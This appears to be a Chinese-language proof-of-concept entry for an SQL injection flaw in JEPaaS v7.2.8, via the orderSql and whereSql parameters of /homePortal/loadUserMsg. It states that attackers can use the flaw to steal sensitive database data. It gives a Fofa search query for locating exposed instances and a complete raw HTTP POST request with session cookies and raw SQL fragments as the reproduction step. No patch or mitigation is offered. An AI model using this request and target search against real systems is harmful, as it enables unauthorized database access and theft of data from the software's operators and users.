# K8-12JEPaaS SQL注入漏洞

<u></u>





### 漏洞描述：JEPaaS v7.2.8版本存在SQL注入漏洞，该漏洞源于/homePortal/loadUserMsg的orderSQL参数缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令窃取数据库敏感数据。



### Fofa语句：title="JEPaaS"



### 漏洞复现：

```
POST /je/portal/homePortal/loadUserMsg HTTP/1.1
Host: 127.0.0.1
Cookie: JSESSIONID=EBBF4E5ABD28C0D803F85102B5FE45BF; password=TVRJeg==; je-local-lang=zh_CN; phone=admin; authorization=eMLA0K6A1imcuRbVKAB
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close
Content-Length: 874

startTime=&endTime=&keyword=&start=0&limit=10&readStatus=WD&tableCode=JE_SYS_USERMSG&orderSql=ORDER%20BY%20SY_CREATETIME%20DESC&whereSql=AND%20USERMSG_JSR_ID%3D'JpgiKFpmxaG9szjInM0'%20AND%20USERMSG_MSGTYPE_CODE%20IN%20('MSG'%2C'DISK'%2C'RZ'%2C'RC'%2C'XSSLH'%2C'XS'%2C'XSXS'%2C'KH'%2C'GH'%2C'WY'%2C'HTHK')%20AND%20USERMSG_YD%20%3D%20'0'&j_query=%7B%22custom%22%3A%5B%7B%22type%22%3A%22%3D%22%2C%22code%22%3A%22USERMSG_JSR_ID%22%2C%22value%22%3A%22JpgiKFpmxaG9szjInM0%22%7D%2C%7B%22type%22%3A%22in%22%2C%22code%22%3A%22USERMSG_MSGTYPE_CODE%22%2C%22value%22%3A%5B%22MSG%22%2C%22DISK%22%2C%22RZ%22%2C%22RC%22%2C%22XSSLH%22%2C%22XS%22%2C%22XSXS%22%2C%22KH%22%2C%22GH%22%2C%22WY%22%2C%22HTHK%22%5D%7D%2C%7B%22type%22%3A%22%3D%22%2C%22code%22%3A%22USERMSG_YD%22%2C%22value%22%3A%220%22%7D%5D%2C%22order%22%3A%5B%7B%22type%22%3A%22DESC%22%2C%22code%22%3A%22SY_CREATETIME%22%7D%5D%7D
```



